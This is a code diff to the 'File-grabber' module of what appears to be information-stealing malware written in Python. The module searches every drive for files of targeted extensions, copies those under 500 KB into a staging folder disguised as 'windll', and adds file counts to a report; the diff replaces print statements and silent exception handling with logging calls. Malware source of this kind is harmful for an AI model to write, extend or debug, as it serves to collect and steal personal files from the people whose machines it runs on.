@@ -14,6 +14,7 @@ import psutil
 from pathlib import Path
 from os.path import getsize
 from shutil import copy2
+from manager.logger import Log
 
 
 def Copy(fileList, path, extension, count):
@@ -23,7 +24,6 @@ def Copy(fileList, path, extension, count):
         try:
             num = fileList[i].rfind("\\")
             fname = fileList[i][num+1:]
-            print(fileList[i])
             size = getsize(fileList[i])
             try:
                  makedirs(rf'{path}\windll\Files\File-Grabber\{extension[1:]}')
@@ -31,8 +31,8 @@ def Copy(fileList, path, extension, count):
                  pass
             if size < 500000:
                 copy2(fileList[i],rf'{path}\windll\Files\File-Grabber\{extension[1:]}\{fname[:-len(extension)]}___{count}{extension}')
-        except:
-            pass
+        except Exception as e:
+            Log(f"{fname[:-len(extension)]}___{count}{extension} --> {e}")
     return count
 
 def Grab(data):
@@ -44,7 +44,7 @@ def Grab(data):
         except:
             pass
         try:
-            print("fg on")
+            Log("===========File-grabber===========")
             data.append("\n\n**📁File-grabber📁**")
 
             filesGrab = [
@@ -59,12 +59,12 @@ def Grab(data):
                     for i in range(len(filesGrab)):
                         try:
                             pathes = list(str(_) for _ in Path(drive.device).glob(filesGrab[i][0]))
-                        except:
-                            pass
+                        except Exception as e:
+                            Log(drive+" search "+e)
                         try:
                             filesGrab[i][1]= Copy(pathes,mainPath,filesGrab[i][0],filesGrab[i][1])
-                        except:
-                           pass
+                        except Exception as e:
+                            Log(drive+" copy "+e)
             for i in range(len(filesGrab)):
                 data.append(f"\n∟📄files{filesGrab[i][0][4:]}: {filesGrab[i][1]}")
             return data
